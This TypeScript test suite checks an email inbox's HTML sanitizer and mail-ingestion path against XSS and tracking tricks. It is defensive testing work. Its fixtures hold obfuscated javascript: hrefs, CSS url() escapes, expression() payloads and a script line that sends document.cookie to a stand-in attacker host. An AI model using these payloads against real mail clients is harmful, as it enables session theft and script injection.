// 收件箱富文本：消毒器 + 入库链路。
//
// 为什么这些用例必须存在：`html_body` 会直接进收件箱的 DOM 附近，
// 而正文完全由任意发信人控制。这里每一条断言对应一个真实的 XSS / 追踪手法，
// 删掉任何一条都等于把那个洞重新打开。
import { describe, it, expect } from "vitest"
import { env } from "cloudflare:workers"
import { makeUser, authRequest, fetchSelf } from "./helpers"
import { sanitizeMailHtml, MAX_MAIL_HTML_CHARS } from "../src/mail-html"
import { resetRootDomainCache } from "../src/root-domains"
import { incomingEmail } from "../src/email-delivery"

describe("sanitizeMailHtml：脚本与事件", () => {
  it("丢 <script> 及其内容（不是只丢标签）", () => {
    const out = sanitizeMailHtml('<p>前</p><script>alert("steal")</script><p>后</p>')
    expect(out).toBe("<p>前</p><p>后</p>")
    expect(out).not.toContain("alert")
  })

  it("丢 <style>，避免 CSS 覆盖与 @import 回连", () => {
    const out = sanitizeMailHtml("<style>body{background:url(https://x/p.png)}</style><p>ok</p>")
    expect(out).toBe("<p>ok</p>")
  })

  it("所有 on* 事件属性被剥掉（含大小写变形）", () => {
    const out = sanitizeMailHtml('<p onClick="x" ONMOUSEOVER=y>t</p>')
    expect(out).toBe("<p>t</p>")
  })

  it("iframe / object / svg / form 连内容一起丢", () => {
    const out = sanitizeMailHtml(
      '<iframe src="https://evil"></iframe><svg><script>x</script></svg><form><input value="1"></form><p>keep</p>'
    )
    expect(out).toBe("<p>keep</p>")
  })

  it("未知标签只丢标签、保留文字（Word 导出的 <o:p>）", () => {
    expect(sanitizeMailHtml("<o:p>正文</o:p>")).toBe("正文")
  })

  it("HTML 注释被丢掉", () => {
    expect(sanitizeMailHtml("<!-- <script>x</script> --><p>a</p>")).toBe("<p>a</p>")
  })

  it("对不上的闭合标签被忽略，不输出孤立闭合标签", () => {
    // 多出来的 </div>：丢掉，别在正文里留下一个孤立的闭合标签
    expect(sanitizeMailHtml("<p>a</p></div>")).toBe("<p>a</p>")
    // 交叉嵌套：</b> 对不上栈顶（<i>），只保留能配上的那一个
    expect(sanitizeMailHtml("<b><i>x</b></i>")).toBe("<b><i>x</i>")
  })
})

describe("sanitizeMailHtml：链接", () => {
  it("javascript: 一律拒绝，且不留「看着能点」的空壳锚点", () => {
    expect(sanitizeMailHtml('<a href="javascript:alert(1)">x</a>')).toBe("x")
  })

  it("实体混淆的 javascript: 也拒绝（浏览器会先解实体）", () => {
    for (const href of [
      "&#106;avascript:alert(1)",
      "javascript&#58;alert(1)",
      "java\tscript:alert(1)",
      "JaVaScRiPt:alert(1)",
      " javascript:alert(1)",
    ]) {
      const out = sanitizeMailHtml(`<a href="${href}">x</a>`)
      expect(out, href).not.toContain("href")
    }
  })

  it("data: / vbscript: / 相对地址一律拒绝（相对地址会被解析成我们自己的站）", () => {
    for (const href of [
      "data:text/html;base64,PHNjcmlwdD4=",
      "vbscript:msgbox(1)",
      "/dashboard/settings",
      "//evil.example/x",
      "settings",
    ]) {
      expect(sanitizeMailHtml(`<a href="${href}">x</a>`), href).not.toContain("href=")
    }
  })

  it("正常链接保留，并强制新窗口 + 断 opener", () => {
    const out = sanitizeMailHtml('<a href="https://example.com/a?b=1&amp;c=2">x</a>')
    expect(out).toContain('href="https://example.com/a?b=1&amp;c=2"')
    expect(out).toContain('target="_blank"')
    expect(out).toContain('rel="noopener noreferrer nofollow"')
  })

  it("mailto 保留", () => {
    expect(sanitizeMailHtml('<a href="mailto:a@b.com">信</a>')).toContain("mailto:a@b.com")
  })
})

describe("sanitizeMailHtml：外部资源（追踪像素）", () => {
  it("<img> 的地址只写进 data-mail-src —— 浏览器不会加载，必须靠代理才显示", () => {
    const out = sanitizeMailHtml('<p>a</p><img src="https://x/p.png" alt="t"><p>b</p>')
    expect(out).toBe('<p>a</p><img data-mail-src="https://x/p.png" alt="t"><p>b</p>')
    // 关键：绝不能出现真正的 src，否则一渲染就回连（data-mail-src 里的 "src" 不算）
    expect(out).not.toMatch(/\ssrc=/)
  })

  it("<img> 的非 http(s) 地址被丢弃（javascript: / data: / 相对路径）", () => {
    for (const src of ["javascript:alert(1)", "data:image/png;base64,AAAA", "/logo.png", "//x/a.png"]) {
      const out = sanitizeMailHtml(`<img src="${src}" alt="t">`)
      expect(out, src).not.toContain("data-mail-src")
    }
  })

  it("<img> 的 srcset / background 一律丢弃", () => {
    const out = sanitizeMailHtml(
      '<img src="https://x/a.png" srcset="https://x/b.png 2x" background="https://x/c.png">'
    )
    expect(out).toBe('<img data-mail-src="https://x/a.png">')
  })

  it("style 里出现 url() 的整条属性丢弃", () => {
    for (const style of [
      "background-image:url(https://x/p.png)",
      "background:URL( 'https://x/p.png' )",
      "list-style-image:url(x.png)",
    ]) {
      const out = sanitizeMailHtml(`<p style="${style}">t</p>`)
      expect(out, style).toBe("<p>t</p>")
    }
  })

  it("正常的排版 style 保留", () => {
    const out = sanitizeMailHtml('<p style="color:#333;font-size:14px;margin:0">t</p>')
    expect(out).toContain('style="color:#333;font-size:14px;margin:0"')
  })

  it("CSS 转义写法的 url() 被拒（\\75 rl( 等价于 url(）", () => {
    // 直接写反斜杠、以及用实体编码绕过，都必须拦住
    for (const style of [
      "background:\\75 rl(https://x/p.png)",
      "background:&#92;75 rl(https://x/p.png)",
    ]) {
      const out = sanitizeMailHtml(`<p style="${style}">t</p>`)
      expect(out, style).toBe("<p>t</p>")
    }
  })

  it("expression() / behavior / -moz-binding 被拒", () => {
    for (const style of ["width:expression(alert(1))", "behavior:url(x.htc)", "-moz-binding:url(x.xml)"]) {
      expect(sanitizeMailHtml(`<p style="${style}">t</p>`), style).not.toContain("style=")
    }
  })
})

describe("sanitizeMailHtml：健壮性", () => {
  it("畸形 HTML 不抛错，也不吞掉后面的正文", () => {
    expect(() => sanitizeMailHtml("<p <b>>a</b> <<<>b")).not.toThrow()
    expect(sanitizeMailHtml("a < b 且 c > d")).toBe("a &lt; b 且 c &gt; d")
    expect(sanitizeMailHtml("<")).toBe("&lt;")
  })

  it("文本里的实体被正确还原并重新转义（不会双重编码）", () => {
    expect(sanitizeMailHtml("<p>a &amp; b &lt;c&gt; &nbsp;d</p>")).toBe(
      "<p>a &amp; b &lt;c&gt; \u00a0d</p>"
    )
  })

  it("空输入返回空串（前端据此回落到纯文本）", () => {
    expect(sanitizeMailHtml("")).toBe("")
    expect(sanitizeMailHtml(null)).toBe("")
    expect(sanitizeMailHtml("<script>x</script>")).toBe("")
  })

  it("未闭合容器标签之后的 <style> 仍会被整段丢弃（查找失败记忆不能串味）", () => {
    // <form> 没闭合 → 「form 找不到闭合标签」被记住；不能因此连 <style> 也跳过查找
    const out = sanitizeMailHtml("<form><input><style>p{color:red}</style><p>正文</p>")
    expect(out).toBe("<p>正文</p>")
    expect(out).not.toContain("color:red")
  })

  it("未闭合的 <script> 之后的内容全部丢弃（与浏览器渲染一致，不把 JS 当正文）", () => {
    expect(sanitizeMailHtml("<p>前</p><script>alert(1)")).toBe("<p>前</p>")
  })

  it("超过上限的输入被截断，不会越界处理", () => {
    const huge = "<p>" + "a".repeat(MAX_MAIL_HTML_CHARS + 5000) + "</p>"
    const out = sanitizeMailHtml(huge)
    expect(out.length).toBeLessThanOrEqual(MAX_MAIL_HTML_CHARS + 16)
  })

  it("大量未闭合 <script> 不会退化成 O(n²)（否则一次投递能把 CPU 烧穿）", () => {
    // 没有闭合标签 ⇒ 每次「跳到闭合标签」的查找都会扫到串尾。
    // 没有「查找失败记忆」时这里是 20000 × 160KB ≈ 3GB 的扫描量。
    const attack = "<script>".repeat(20000)
    const started = Date.now()
    const out = sanitizeMailHtml(attack)
    const cost = Date.now() - started
    expect(out).toBe("")
    // 阈值给得很松：正常实现是个位数毫秒，这里只用来卡住数量级退化
    expect(cost).toBeLessThan(1500)
  })

  it("大量未闭合 <style> 同样线性", () => {
    const attack = "<style>".repeat(20000)
    const started = Date.now()
    sanitizeMailHtml(attack)
    expect(Date.now() - started).toBeLessThan(1500)
  })
})

// ---------------------------------------------------------------------------
// 入库链路：真的收到一封带恶意 HTML 的邮件，落库的必须是干净版本
// ---------------------------------------------------------------------------

function makeHtmlMessage(to: string, html: string) {
  const boundary = "b" + crypto.randomUUID().replace(/-/g, "")
  const lines = [
    "From: Sender <sender@example.com>",
    `To: ${to}`,
    "Subject: 验证你的邮箱",
    `Message-ID: <mid-${crypto.randomUUID()}@example.com>`,
    `Content-Type: multipart/alternative; boundary="${boundary}"`,
    "",
    `--${boundary}`,
    "Content-Type: text/plain; charset=utf-8",
    "",
    "请点击链接验证",
    `--${boundary}`,
    "Content-Type: text/html; charset=utf-8",
    "",
    html,
    `--${boundary}--`,
    "",
  ]
  const bytes = new TextEncoder().encode(lines.join("\r\n"))
  const rejected: string[] = []
  return {
    rejected,
    msg: {
      from: "sender@example.com",
      to,
      headers: new Headers({ subject: "verify your email" }),
      raw: new ReadableStream({
        start(c) {
          c.enqueue(bytes)
          c.close()
        },
      }),
      rawSize: bytes.byteLength,
      setReject(reason: string) {
        rejected.push(reason)
      },
      async forward() {},
      async reply() {
        return new Response(null)
      },
    },
  }
}

describe("入站邮件：html_body 落库", () => {
  async function seedMailbox(address: string) {
    const user = await makeUser()
    await env.DB.prepare(
      "INSERT INTO mailboxes (id, user_id, address, created_at) VALUES (?, ?, ?, ?)"
    )
      .bind(crypto.randomUUID(), user.id, address, new Date().toISOString())
      .run()
    return user
  }

  async function readStored(address: string) {
    return env.DB.prepare(
      `SELECT m.text_body, m.html_body FROM messages m
         JOIN mailboxes b ON b.id = m.mailbox_id
        WHERE b.address = ? COLLATE NOCASE
        ORDER BY m.received_at DESC LIMIT 1`
    )
      .bind(address)
      .first<{ text_body: string; html_body: string | null }>()
  }

  it("存进去的是消毒后的版本：脚本 / 事件 / 追踪像素都不在库里", async () => {
    await env.DB.prepare(
      `INSERT INTO root_domains
         (name, zone_id, label, requires_feature, dns_price_per_year, is_default, enabled, created_at)
       VALUES ('tyu.me', NULL, NULL, NULL, 0, 0, 1, ?)`
    )
      .bind(new Date().toISOString())
      .run()
    resetRootDomainCache()

    const address = `html_${Math.random().toString(36).slice(2, 8)}@tyu.me`
    await seedMailbox(address)

    const box = makeHtmlMessage(
      address,
      '<div style="padding:8px"><b>你好</b>' +
        '<img src="https://tracker.example/pixel.gif">' +
        '<script>fetch("https://evil.example/"+document.cookie)</script>' +
        '<a href="javascript:alert(1)" onclick="x()">点我</a>' +
        '<a href="https://cloud.doulor.cn/reset?t=1">重置密码</a></div>'
    )
    await incomingEmail(box.msg as never, env)
    expect(box.rejected).toEqual([])

    const row = await readStored(address)
    expect(row?.html_body).toBeTruthy()
    const html = row!.html_body!

    // 干净的排版保留
    expect(html).toContain("<b>你好</b>")
    expect(html).toContain('style="padding:8px"')
    expect(html).toContain('href="https://cloud.doulor.cn/reset?t=1"')
    // 危险内容全部不在
    expect(html).not.toContain("<script")
    expect(html).not.toContain("javascript:")
    expect(html).not.toContain("onclick")
    // 图片：地址仍在库里，但只是**不会自动加载**的 data-mail-src，
    // 真正渲染时由读取侧换成签名的代理地址（见 mail-image.test.ts）
    expect(html).toContain('data-mail-src="https://tracker.example/pixel.gif"')
    expect(html).not.toMatch(/<img[^>]*\ssrc=/)
    // 纯文本视图用**邮件自带的 text/plain 部分**（有多部分时不去从 HTML 转，
    // 转换结果一定不如发件人自己写的纯文本）
    expect(row!.text_body).toContain("请点击链接验证")
  })

  it("HTML 超过入库上限时被截断，不会把 D1 单行 2MB 顶爆", async () => {
    const address = `huge_${Math.random().toString(36).slice(2, 8)}@tyu.me`
    await seedMailbox(address)

    // 正文里塞 200K 字符：远超 96K 的消毒源上限
    const body = "<p>" + "x".repeat(200_000) + "</p>"
    const lines = [
      "From: Sender <sender@example.com>",
      `To: ${address}`,
      "Subject: huge",
      `Message-ID: <mid-${crypto.randomUUID()}@example.com>`,
      "Content-Type: text/html; charset=utf-8",
      "",
      body,
    ]
    const bytes = new TextEncoder().encode(lines.join("\r\n"))
    const msg = {
      from: "sender@example.com",
      to: address,
      headers: new Headers({ subject: "huge" }),
      raw: new ReadableStream({
        start(c) {
          c.enqueue(bytes)
          c.close()
        },
      }),
      rawSize: bytes.byteLength,
      setReject() {},
      async forward() {},
      async reply() {
        return new Response(null)
      },
    }
    await incomingEmail(msg as never, env)

    const row = await readStored(address)
    expect(row?.html_body).toBeTruthy()
    // 128K 字符是 email-delivery.ts 里 MAX_HTML_BODY_CHARS 的口径
    expect(row!.html_body!.length).toBeLessThanOrEqual(128 * 1024)
    // 截断了也要能渲染：开头的 <p> 还在
    expect(row!.html_body!.startsWith("<p>")).toBe(true)
  })

  it("只有 HTML 部分的邮件：text_body 由 HTML 转出，纯文本视图不会空白", async () => {
    const address = `htmlonly_${Math.random().toString(36).slice(2, 8)}@tyu.me`
    await seedMailbox(address)

    const lines = [
      "From: Sender <sender@example.com>",
      `To: ${address}`,
      "Subject: html only",
      `Message-ID: <mid-${crypto.randomUUID()}@example.com>`,
      "Content-Type: text/html; charset=utf-8",
      "",
      "<p>第一段</p><p>第二段</p>",
    ]
    const bytes = new TextEncoder().encode(lines.join("\r\n"))
    const msg = {
      from: "sender@example.com",
      to: address,
      headers: new Headers({ subject: "html only" }),
      raw: new ReadableStream({
        start(c) {
          c.enqueue(bytes)
          c.close()
        },
      }),
      rawSize: bytes.byteLength,
      setReject() {},
      async forward() {},
      async reply() {
        return new Response(null)
      },
    }
    await incomingEmail(msg as never, env)

    const row = await readStored(address)
    expect(row?.html_body).toContain("第一段")
    expect(row?.text_body).toContain("第一段")
  })

  it("只有纯文本的邮件不写 html_body（前端回落到纯文本视图）", async () => {
    const address = `plain_${Math.random().toString(36).slice(2, 8)}@tyu.me`
    await seedMailbox(address)

    const lines = [
      "From: Sender <sender@example.com>",
      `To: ${address}`,
      "Subject: plain",
      `Message-ID: <mid-${crypto.randomUUID()}@example.com>`,
      "Content-Type: text/plain; charset=utf-8",
      "",
      "只有文字",
    ]
    const bytes = new TextEncoder().encode(lines.join("\r\n"))
    const msg = {
      from: "sender@example.com",
      to: address,
      headers: new Headers({ subject: "plain" }),
      raw: new ReadableStream({
        start(c) {
          c.enqueue(bytes)
          c.close()
        },
      }),
      rawSize: bytes.byteLength,
      setReject() {},
      async forward() {},
      async reply() {
        return new Response(null)
      },
    }
    await incomingEmail(msg as never, env)

    const row = await readStored(address)
    expect(row?.text_body).toContain("只有文字")
    expect(row?.html_body).toBeNull()
  })

  it("端到端：收件箱接口返回 bodyHtml，图片地址已换成本站签名代理", async () => {
    // 确保根域存在（同文件另一个用例可能已经建过，避免唯一约束冲突）
    const known = await env.DB.prepare("SELECT 1 AS ok FROM root_domains WHERE name = 'tyu.me'").first()
    if (!known) {
      await env.DB.prepare(
        `INSERT INTO root_domains
           (name, zone_id, label, requires_feature, dns_price_per_year, is_default, enabled, created_at)
         VALUES ('tyu.me', NULL, NULL, NULL, 0, 0, 1, ?)`
      )
        .bind(new Date().toISOString())
        .run()
      resetRootDomainCache()
    }

    const user = await makeUser()
    const address = `${user.username}@tyu.me`
    const mailboxId = crypto.randomUUID()
    await env.DB.prepare(
      "INSERT INTO mailboxes (id, user_id, address, created_at) VALUES (?, ?, ?, ?)"
    )
      .bind(mailboxId, user.id, address, new Date().toISOString())
      .run()

    await incomingEmail(
      makeHtmlMessage(
        address,
        '<p>看这个图：</p><img src="https://cdn.example.com/a.png" alt="a">'
      ).msg as never,
      env
    )

    const row = await env.DB.prepare(
      "SELECT id FROM messages WHERE mailbox_id = ? ORDER BY received_at DESC LIMIT 1"
    )
      .bind(mailboxId)
      .first<{ id: string }>()

    const res = await fetchSelf(
      authRequest(user, `/api/mailbox/${mailboxId}/messages/${row!.id}`)
    )
    expect(res.status).toBe(200)
    const data = await res.json<{ message: { body: string; bodyHtml: string | null } }>()

    // 纯文本视图来自邮件自带的 text/plain 部分
    expect(data.message.body).toContain("请点击链接验证")
    const html = data.message.bodyHtml!
    expect(html).toBeTruthy()
    expect(html).toContain("看这个图")
    // 图片已指向我们自己的代理（带签名），库里那个惰性属性不再出现
    expect(html).toContain("/api/mail/img?src=")
    expect(html).not.toContain("data-mail-src")
    // 签名参数存在且不是明文地址直连
    expect(html).toContain("&amp;s=")
  })
})
